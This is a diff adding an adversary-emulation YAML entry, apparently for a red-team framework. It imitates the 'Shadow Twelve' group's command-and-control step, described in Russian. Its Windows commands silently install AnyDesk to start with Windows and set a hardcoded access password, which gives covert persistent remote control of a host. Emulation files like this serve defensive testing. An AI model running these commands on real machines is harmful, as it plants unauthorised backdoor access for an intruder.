@@ -1,0 +1,17 @@
+- id: 612b6cfa-4ebe-4e50-bb1f-9feff9f4aaac
+  name: "[SHADOW-TWELVE] AnyDesk installation"
+  description: "Shadow использует инструмент AnyDesk для управления скомпрометированными хостами и обеспечения постоянного скрытного доступа"
+  tactic: command-and-control
+  technique:
+    attack_id: T1219.002 
+    name: "Remote Access Tools: Remote Desktop Software"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          copy Anydesk.exe C:\ProgramData\Anydesk.exe &
+          C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win –silent &
+          echo VCUJ3kvi23vf2 | C:\ProgramData\anydesk.exe --set-password &
+        timeout: 60
+        payloads:
+          - AnyDesk.exe
